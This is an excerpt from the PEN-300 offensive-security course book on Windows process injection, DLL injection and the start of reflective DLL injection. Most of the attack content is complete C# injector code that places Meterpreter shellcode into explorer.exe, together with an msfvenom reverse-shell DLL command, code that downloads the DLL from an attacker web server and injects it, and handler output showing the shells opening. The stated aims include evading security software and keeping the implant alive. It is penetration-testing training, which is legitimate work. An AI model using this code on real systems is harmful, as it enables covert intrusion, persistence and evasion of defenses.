237 (Fortinet, 2018), https://www.fortinet.com/blog/threat-research/new-jrat-adwind-variant-being-spread-with-package-delivery-
scam.html 
238 (Baeldung, 2019), https://www.baeldung.com/java-nashorn 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
131 
 
5 Process Injection and Migration 
Now that we have demonstrated various ways to get a reverse shell, it is time to examine the 
inner workings of these techniques and discuss how we can manually inject our code into other 
programs and migrate to different processes. 
When obtaining a reverse shell, be it a Meterpreter, regular command shell, or a shell from 
another framework, it must execute within a process. A typical shellcode runner (like those we 
developed in Microsoft Word, PowerShell, and Jscript) executes the shell inside its own process. 
There are potential issues with this approach. First, the victim may close the application, which 
could shut down our shell. Second, security software may detect network communication from a 
process that normally doesn’t generate it and block our shell. 
One way to overcome these challenges is with process injection or process migration. In this 
module, we’ll discuss these concepts and demonstrate various implementation techniques. 
5.1 Finding a Home for Our Shellcode 
To extend the longevity of our implant, we can execute it in a process that is unlikely to terminate. 
One such process is explorer.exe, which is responsible for hosting the user’s desktop experience. 
We could also inject into a new hidden process like notepad.exe, or we could migrate to a process 
like svchost.exe that performs network communication. 
5.1.1 Process Injection and Migration Theory 
In this section, we’ll discuss the basic theory behind process injection and migration. 
By definition, a process is a container that is created to house a running application. Each 
Windows process maintains its own virtual memory space. Although these spaces are not meant 
to directly interact with one another, we may be able to accomplish this with various Win32 APIs. 
On the other hand, a thread executes the compiled assembly code of the application. A process 
may have multiple threads to perform simultaneous actions and each thread will have its own 
stack and shares the virtual memory space of the process. 
As an overview, we can initiate Windows-based process injection by opening a channel from one 
process to another through the Win32 OpenProcess239 API. We’ll then modify its memory space 
through the VirtualAllocEx240 and WriteProcessMemory241 APIs, and finally create a new execution 
thread inside the remote process with CreateRemoteThread.242 
 
239 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess 
240 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex 
241 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory 
242 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createremotethread 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
132 
We will discuss these APIs in more detail in the next section, but we need to take a moment to 
discuss security permissions. The OpenProcess API opens an existing local process for 
interaction and must be supplied with three parameters. The first argument, dwDesiredAccess, 
establishes the access rights243 we require on that process. Let’s take a moment to discuss these 
access rights. 
To call OpenProcess successfully, our current process must possess the appropriate security 
permissions. Every process has a Security Descriptor244 that specifies the file permissions of the 
executable and access rights of a user or group, originating from the creator of the process. This 
can effectively block privilege elevation. 
All processes also have an Integrity level245 that restricts access to it. This works by blocking 
access from one process to another that has a higher Integrity level, however accessing a 
process with a lower Integrity level is generally possible. 
Let’s examine these settings on our Development machine. First, we’ll execute Notepad as our 
standard Offsec user. Then we’ll examine the security setting of the process by launching the 64-
bit version of Process Explorer, selecting Notepad, opening the Properties window, and navigating 
to the Security tab: 
 
Figure 42: Security settings of Notepad run as a normal user 
 
243 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights 
244 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors 
245 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
133 
 
This output details the users and groups that may interact with the process as well as the 
integrity levels. In this case, this Notepad process runs at Medium Integrity, which is a standard 
level for most processes. 
We can click the Permissions button to open a new window showing the specific user 
permissions. By selecting the Offsec user, we find that we have both read and write permissions 
to the process (Figure 43). 
 
Figure 43: Permissions of Notepad process by Offsec user 
With these settings we should be able to use OpenProcess to open a handle to the Notepad 
process. 
In contrast, if we open Notepad as an administrator through the Run as administrator feature and 
look at the same Security tab in Process Explorer for the new Notepad instance, we find the same 
set of users and groups have access but that it is now running as a high integrity level process 
(Figure 44). Note that in order to access properties for processes running at integrity levels higher 
than medium, we must launch Process Explorer as a high integrity process by right-clicking the 
executable and selecting “Run as administrator”. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
134 
 
Figure 44: Permissions to Notepad process by Offsec user 
In this case, OpenProcess will fail if we execute it as part of our code in a Word macro or Jscript 
file since the integrity level of the target process will be higher. 
In general, we can only inject code into processes running at the same or lower integrity level of 
the current process. This makes explorer.exe a prime target because it will always exist and does 
not exit until the user logs off. Because of this, we will shift our focus to explorer.exe. 
Now that we have selected a process and know the security level we need, we can discuss the 
second and third arguments to OpenProcess. The second, bInheritHandle, determines if the 
returned handle may be inherited by a child process and the third, dwProcessId, specifies the 
process identifier of the target process. We will discuss the values of these settings in the next 
section. 
Next, we can discuss the VirtualAllocEx API. In our previous shellcode runner, we used VirtualAlloc 
to allocate memory for our shellcode. Unfortunately, that only works inside the current process so 
we must use the expanded VirtualAllocEx API. This API can perform actions in any process that 
we have a valid handle to. 
The next API, WriteProcessMemory, will allow us to copy data into the remote process. Note that 
since our previous RtlMoveMemory and C# Copy methods do not support remote copy, they are 
not useful here. 
Similarly, since CreateThread does not support the creation of remote process threads, we must 
rely on the CreateRemoteThread API instead. 
Now that we’ve introduced these APIs, let’s begin implementing them in C#. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
135 
5.1.2 Process Injection in C# 
To begin our process injection implementation, we’ll generate a project. Let’s head back to our 
Windows 10 development machine, open the ConsoleApp1 Visual Studio solution and create a 
new .NET standard Console App project called “Inject” using the Solution Explorer. 
Once this is open, we’ll begin to import the four required APIs we discussed earlier. Let’s start by 
searching for the P/Invoke OpenProcess DllImport statement on www.pinvoke.net. 
We’ll copy the DllImport statement into the Program class and add a “using” statement for the 
System.Runtime.InteropServices namespace. 
using System; 
using System.Runtime.InteropServices; 
 
namespace Inject 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId); 
         
        static void Main(string[] args) 
        { 
        } 
    } 
} 
Listing 158 - Importing OpenProcess using DllImport and P/Invoke 
Now that we have the correct syntax for the import statement, let’s figure out the OpenProcess 
API’s arguments from its function prototype on MSDN246 (Listing 159). 
HANDLE OpenProcess( 
  DWORD dwDesiredAccess, 
  BOOL  bInheritHandle, 
  DWORD dwProcessId 
); 
Listing 159 - OpenProcess function prototype 
The first argument (dwDesiredAccess) is the access right we want to obtain for the remote 
process. Its value will be checked against the security descriptor. In our case, we request the 
PROCESS_ALL_ACCESS247 process right, which will give us complete access to the explorer.exe 
process. PROCESS_ALL_ACCESS has a hexadecimal representation of 0x001F0FFF. 
Next, we need to decide whether or not a created child process can inherit this handle 
(bInheritHandle). In our case, we do not care and can simply pass the value false. The final 
argument (dwProcessId) is the process ID of explorer.exe, which we can easily obtain through 
Process Explorer. 
 
246 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess 
247 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/procthread/process-security-and-access-rights 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
136 
 
In the case of this example, the process ID of explorer.exe is 4804, but this 
changes after each login and varies by machine. 
We can now implement the call to OpenProcess as displayed in Listing 160. 
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804); 
Listing 160 - Calling OpenProcess against explorer.exe 
Now that we have an open channel from one process to another, we must allocate memory for 
our shellcode using VirtualAllocEx, which requires us to perform another import. We’ll again use 
www.pinvoke.net to find the import shown in Listing 161. 
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,  
  uint dwSize, uint flAllocationType, uint flProtect); 
Listing 161 - Importing VirtualAllocEx 
To enumerate the VirtualAllocEx arguments, we’ll again turn to MSDN to find the function 
prototype248 shown in Listing 162. 
LPVOID VirtualAllocEx( 
  HANDLE hProcess, 
  LPVOID lpAddress, 
  SIZE_T dwSize, 
  DWORD  flAllocationType, 
  DWORD  flProtect 
); 
Listing 162 - VirtualAllocEx function prototype 
The first argument (hProcess) is the process handle to explorer.exe that we just obtained from 
OpenProcess and the second, lpAddress, is the desired address of the allocation in the remote 
process. If the API succeeds, our new buffer will be allocated with a starting address as supplied 
in lpAddress. 
It should be noted that if the address given with lpAddress is already allocated and in use, the call 
will fail. It is better to pass a null value and let the API select an unused address. 
The last three arguments (dwSize, flAllocationType, and flProtect) mirror the VirtualAlloc API 
parameters and specify the size of the desired allocation, the allocation type, and the memory 
protections. We’ll set these to 0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 
(PAGE_EXECUTE_READWRITE), respectively. The VirtualAllocEx invocation is shown in Listing 
163. 
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
Listing 163 - Calling VirtualAllocEx against explorer.exe 
 
248 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
137 
After allocating memory, we’ll generate a 64-bit Meterpreter staged shellcode with msfvenom in 
csharp format and embed it in the code. 
Next, we’ll copy the shellcode into the memory space of explorer.exe. We’ll use 
WriteProcessMemory for this, and again copy the import statement from www.pinvoke.net. 
[DllImport("kernel32.dll")] 
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,  
    byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); 
Listing 164 - Importing WriteProcessMemory 
WriteProcessMemory also takes five parameters, and MSDN lists the following prototype:249 
BOOL WriteProcessMemory( 
  HANDLE  hProcess, 
  LPVOID  lpBaseAddress, 
  LPCVOID lpBuffer, 
  SIZE_T  nSize, 
  SIZE_T  *lpNumberOfBytesWritten 
); 
Listing 165 - WriteProcessMemory function prototype 
We first pass the process handle (hProcess) followed by the newly allocated memory address 
(lpBaseAddress) in explorer.exe along with the address of the byte array (lpBuffer) containing the 
shellcode. The remaining two arguments are the size of the shellcode to be copied (nSize) and a 
pointer to a location in memory (lpNumberOfBytesWritten) to output how much data was copied. 
The call to WriteProcessMemory is shown below in Listing 166. 
byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc... 
 
IntPtr outSize; 
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize); 
Listing 166 - Calling WriteProcessMemory against explorer.exe 
Notice that the out250 keyword was prepended to the outSize variable to have it passed by 
reference instead of value. This ensures that the argument type aligns with the function 
prototype. The input buffer (buf) also needs to be a pointer but this is inherent in the C# array data 
type. 
At this stage, we can execute the shellcode. We’ll import CreateRemoteThread with the statement 
copied from www.pinvoke.net: 
[DllImport("kernel32.dll")] 
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,  
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,  
        IntPtr lpThreadId); 
Listing 167 - Importing CreateRemoteThread 
 
249 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory 
250 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/out-parameter-modifier 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
138 
Once more, we’ll inspect the arguments on MSDN.251 Listing 168 shows the function prototype. 
HANDLE CreateRemoteThread( 
  HANDLE                 hProcess, 
  LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
  SIZE_T                 dwStackSize, 
  LPTHREAD_START_ROUTINE lpStartAddress, 
  LPVOID                 lpParameter, 
  DWORD                  dwCreationFlags, 
  LPDWORD                lpThreadId 
); 
Listing 168 - CreateRemoteThread function prototype 
This API accepts seven arguments, but we will ignore those that aren’t required. The first 
argument is the process handle to explorer.exe, followed by the desired security descriptor of the 
new thread (lpThreadAttributes) and its allowed stack size (dwStackSize). We will set these to “0” 
to accept the default values. 
For the fourth argument, lpStartAddress, we must specify the starting address of the thread. In 
our case, it must be equal to the address of the buffer we allocated and copied our shellcode into 
inside the explorer.exe process. The next argument, lpParameter, is a pointer to variables which 
will be passed to the thread function pointed to by lpStartAddress. Since our shellcode does not 
need any parameters, we can pass a NULL here. 
The remaining two arguments include various flags (dwCreationFlags) and an output variable for 
a thread ID (lpThreadId), both of which we will ignore. The call to CreateRemoteThread is shown in 
Listing 169. 
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, 
IntPtr.Zero); 
Listing 169 - Calling CreateRemoteThread against explorer.exe 
Let’s review the full code, with the included (abridged) Meterpreter staged shellcode: 
using System; 
using System.Runtime.InteropServices; 
 
 
namespace Inject 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId); 
 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint 
dwSize, uint flAllocationType, uint flProtect); 
 
 
251 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createremotethread 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
139 
        [DllImport("kernel32.dll")] 
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr 
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint 
dwCreationFlags, IntPtr lpThreadId); 
        static void Main(string[] args) 
        { 
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804); 
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
            byte[] buf = new byte[591] { 
            
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 
            .... 
            0x0a,0x41,0x89,0xda,0xff,0xd5 }; 
                        IntPtr outSize; 
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize); 
 
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, 
IntPtr.Zero, 0, IntPtr.Zero); 
        } 
    } 
} 
Listing 170 - Full code 
Before compiling the project, we need to remember to set the CPU architecture to x64 since we 
are injecting into a 64-bit process. 
Note that 64-bit versions of Windows can run both 32 and 64-bit processes. This means that we 
could face four potential migration paths: 64-bit -> 64-bit, 64-bit -> 32-bit, 32-bit -> 32-bit and 32-bit 
-> 64-bit. 
The first three paths will work as expected. However, the fourth (32-bit -> 64-bit) will fail since 
CreateRemoteThread does not support this. One workaround (which is what advanced implants 
like Meterpreter do)252 is to execute the call directly in assembly. The technique involves 
performing a translation from 32-bit to 64-bit long mode inside the 32-bit process. This is not 
officially supported and requires a lot of custom assembly code. This approach is outside the 
scope of this module. 
After compiling the project, we’ll configure a Meterpreter listener and execute our process, 
injecting the shellcode. If all goes well, we will obtain a reverse shell running inside explorer.exe as 
shown in Listing 171. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.12; (UUID: abrlqwbz) 
 
252 (OpenWireSec, 2013), 
https://github.com/OpenWireSec/metasploit/blob/master/external/source/meterpreter/source/common/arch/win/i386/base_inject.c 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
140 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.12:51449) at 
2019-10-14 09:02:37 -0400 
 
meterpreter > getpid 
Current pid: 4804 
Listing 171 - Meterpreter shell from within explorer.exe 
The process ID indicates that the Meterpreter shell is indeed running inside explorer.exe. 
We were able to launch our Meterpreter shellcode directly inside explorer.exe, which means that 
even if the original process is killed, the shell will live on. 
We’ve successfully injected arbitrary shellcode into another process. Good. 
5.1.2.1 Exercises 
1. 
Replicate the steps and inject a reverse Meterpreter shell into the explorer.exe process. 
2. 
Modify the code of the ExampleAssembly project in DotNetToJscript to create a Jscript file 
that executes the shellcode inside explorer.exe. Instead of hardcoding the process ID, which 
cannot be known remotely, use the Process.GetProcessByName253 method to resolve it 
dynamically. 
3. 
Port the code from C# to PowerShell to allow process injection and shellcode execution 
from a Word macro through PowerShell. Remember that PowerShell is started as 32-bit, so 
instead of injecting into explorer.exe, start a 32-bit process such as Notepad and inject into 
that instead. 
5.1.2.2 Extra Mile 
Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is 
considered a standard technique, but there are a few others to consider. 
The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and 
NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory. 
Create C# code that performs process injection using the four new APIs instead of VirtualAllocEx 
and WriteProcessMemory. Convert the code to Jscript with DotNetToJscript. Note that 
CreateRemoteThread must still be used to execute the shellcode. 
5.2 DLL Injection 
Process injection allowed us to inject arbitrary shellcode into a remote process and execute it. 
This served us well for shellcode, but for larger codebases or pre-existing DLLs, we might want to 
inject an entire DLL into a remote process instead of just shellcode. 
 
253 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
141 
5.2.1 DLL Injection Theory 
When a process needs to use an API from a DLL, it calls the LoadLibrary254 API to load it into 
virtual memory space. In our case, we want the remote process to load our DLL using Win32 
APIs. Unfortunately, LoadLibrary can not be invoked on a remote process, so we’ll have to perform 
a few tricks to force a process like explorer.exe to load our DLL. The MSDN function prototype of 
LoadLibrary (Listing 172),255 reveals that the function only requires one parameter: the name of 
the DLL to load (lpLibFileName): 
HMODULE LoadLibraryA( 
  LPCSTR lpLibFileName 
); 
Listing 172 - LoadLibrary function prototype 
Many Win32 APIs come in two variants with a suffix of “A” or “W”. In this 
instance, it would be LoadLibraryA or LoadLibraryW and describes if any string 
arguments are to be given as ASCII (“A”) or Unicode (“W”) but otherwise signify 
the same functionality. 
Our approach will be to try to trick the remote process into executing LoadLibrary with the correct 
argument. Recall that when calling CreateRemoteThread, the fourth argument is the start address 
of the function run in the new thread and the fifth argument is the memory address of a buffer 
containing arguments for that function. 
The idea is to resolve the address of LoadLibraryA inside the remote process and invoke it while 
supplying the name of the DLL we want to load. If the address of LoadLibraryA is given as the 
fourth argument to CreateRemoteThread, it will be invoked when we call CreateRemoteThread. 
In order to supply the name of the DLL to LoadLibraryA, we must allocate a buffer inside the 
remote process and copy the name and path of the DLL into it. The address of this buffer can 
then be given as the fifth argument to CreateRemoteThread, after which it will be used with 
LoadLibrary. 
However, there are several restrictions we must consider. First, the DLL must be written in C or 
C++ and must be unmanaged. The managed C#-based DLL we have been working with so far will 
not work because we can not load a managed DLL into an unmanaged process. 
Secondly, DLLs normally contain APIs that are called after the DLL is loaded. In order to call these 
APIs, an application would first have to “resolve” their names to memory addresses through the 
use of GetProcAddress. Since GetProcAddress cannot resolve an API in a remote process, we 
must craft our malicious DLL in a non-standard way. 
 
254 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya 
255 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
142 
Let’s take a moment to discuss this approach. As part of its functionality, LoadLibrary calls the 
DllMain256 function inside the DLL, which initializes variables and signals that the DLL is ready to 
use. Listing 173 shows the DllMain function prototype: 
BOOL WINAPI DllMain( 
  _In_ HINSTANCE hinstDLL, 
  _In_ DWORD     fdwReason, 
  _In_ LPVOID    lpvReserved 
); 
Listing 173 - The DllMain function prototype 
Typically, DllMain performs different actions based on the reason code (fdwReason) argument 
that indicates why the DLL entry-point function is being called. 
We can see this in the unmanaged DllMain code shown in Listing 174. 
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) 
{ 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH: 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 
    return TRUE; 
} 
Listing 174 - The DllMain function is called on module load 
As stated in the MSDN documentation, the DLL_PROCESS_ATTACH reason code is passed to 
DllMain when the DLL is being loaded into the virtual memory address space as a result of a call 
to LoadLibrary. This means that instead of defining our shellcode as a standard API exported by 
our malicious DLL, we could put our shellcode within the DLL_PROCESS_ATTACH switch case, 
where it will be executed when LoadLibrary calls DllMain. 
To use this technique, we either have to write and compile a custom unmanaged DLL in C or C++ 
that will execute shellcode when the DllMain function is called, or use a framework to generate 
one. Since C and C++ programming is outside the scope of this module, in the next section, we’ll 
use the latter approach to generate a Meterpreter DLL with msfvenom, leveraging the technique 
explained above. 
5.2.2 DLL Injection with C# 
Let’s begin by generating our DLL with msfvenom, saving the file to our web root: 
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll 
Listing 175 - Generating Meterpreter shellcode 
 
256 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
143 
To implement the DLL injection technique, we are going to create a new C# .NET Standard 
Console app that will fetch our DLL from the attacker’s web server. We’ll then write the DLL to disk 
since LoadLibrary only accepts files present on disk. This code is shown below (Listing 176): 
using System.Net; 
... 
 
String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); 
String dllName = dir + "\\met.dll"; 
 
WebClient wc = new WebClient(); 
wc.DownloadFile("http://192.168.119.120/met.dll", dllName); 
Listing 176 - Downloading a DLL and writing it to disk 
Next, we’ll resolve the process ID of explorer.exe and pass it to OpenProcess: 
Process[] expProc = Process.GetProcessesByName("explorer"); 
int pid = expProc[0].Id; 
 
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
Listing 177 - OpenProcess called on explorer.exe 
For the next step, we’ll use VirtualAllocEx to allocate memory in the remote process that is 
readable and writable and then use WriteProcessMemory to copy the path and name of the DLL 
into it (Listing 178): 
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4); 
 
IntPtr outSize; 
Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), 
dllName.Length, out outSize); 
Listing 178 - Allocating and copying the name of the DLL into explorer.exe 
Next, we’ll resolve the memory address of LoadLibrayA inside the remote process. Luckily, most 
native Windows DLLs are allocated at the same base address across processes, so the address 
of LoadLibraryA in our current process will be the same as in the remote. 
To locate its address, we’ll use the combination of GetModuleHandle and GetProcAddress to 
resolve it and add the associated DllImport statements: 
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"); 
Listing 179 - Locating the address of LoadLibraryA 
Finally, we can invoke CreateRemoteThread, this time supplying both a starting address and an 
argument address: 
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, 
IntPtr.Zero); 
Listing 180 - Creating a remote thread with argument 
Our full DLL injection code is as follows: 
using System; 
using System.Diagnostics; 
using System.Net; 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
144 
using System.Runtime.InteropServices; 
using System.Text; 
 
namespace Inject 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId); 
 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint 
dwSize, uint flAllocationType, uint flProtect); 
 
        [DllImport("kernel32.dll")] 
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr 
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint 
dwCreationFlags, IntPtr lpThreadId); 
 
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, 
SetLastError = true)] 
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
 
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] 
        public static extern IntPtr GetModuleHandle(string lpModuleName); 
 
        static void Main(string[] args) 
        { 
 
            String dir = 
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); 
            String dllName = dir + "\\met.dll"; 
 
            WebClient wc = new WebClient(); 
            wc.DownloadFile("http://192.168.119.120/met.dll", dllName); 
 
            Process[] expProc = Process.GetProcessesByName("explorer"); 
            int pid = expProc[0].Id; 
 
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
            IntPtr outSize; 
            Boolean res = WriteProcessMemory(hProcess, addr, 
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize); 
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), 
"LoadLibraryA"); 
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, 
addr, 0, IntPtr.Zero); 
        } 
    } 
} 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
145 
Listing 181 - Creating a remote thread with argument 
When we compile and execute the completed code, it fetches the Meterpreter DLL from the web 
server and gives us a reverse shell: 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 182 - Getting a reverse shell 
We can display all the loaded DLLs in the processes with Process Explorer. We’ll select the 
explorer.exe process, navigate to View > Lower Pane View and select DLLs. Scrolling down, we 
find met.dll as expected (Figure 45). 
 
Figure 45: Meterpreter DLL loaded in explorer.exe 
By reusing the techniques from process injection, we are able to load an unmanaged DLL into a 
remote process. Unfortunately, this technique does write the DLL to disk. In the next section, we’ll 
tackle this issue. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
146 
5.2.2.1 Exercise 
1. 
Recreate the DLL injection technique and inject a Meterpreter DLL into explorer.exe from a 
Jscript file using DotNetToJscript. 
5.3 Reflective DLL Injection 
Loading a DLL into a remote process is powerful, but writing the DLL to disk is a significant 
compromise. To improve our tradecraft, let’s explore a technique known as reflective DLL 
injection.257 
5.3.1 Reflective DLL Injection Theory 
LoadLibrary performs a series of actions including loading DLL files from disk and setting the 
correct memory permissions. It also registers the DLL so it becomes usable from APIs like 
GetProcAddress and is visible to tools like Process Explorer. 
Since we do not need to rely on GetProcAddress and want to avoid detection, we are only 
interested in the memory mapping of the DLL. Reflective DLL injection parses the relevant fields 
of the DLL’s Portable Executable258 (PE) file format and maps the contents into memory. 
In order to implement reflective DLL injection, we could write custom code to essentially recreate 
and improve upon the functionality of LoadLibrary. Since the inner workings of the code and the 
details of the PE file format are beyond the scope of this module, we will instead reuse existing 
code to execute these techniques. 
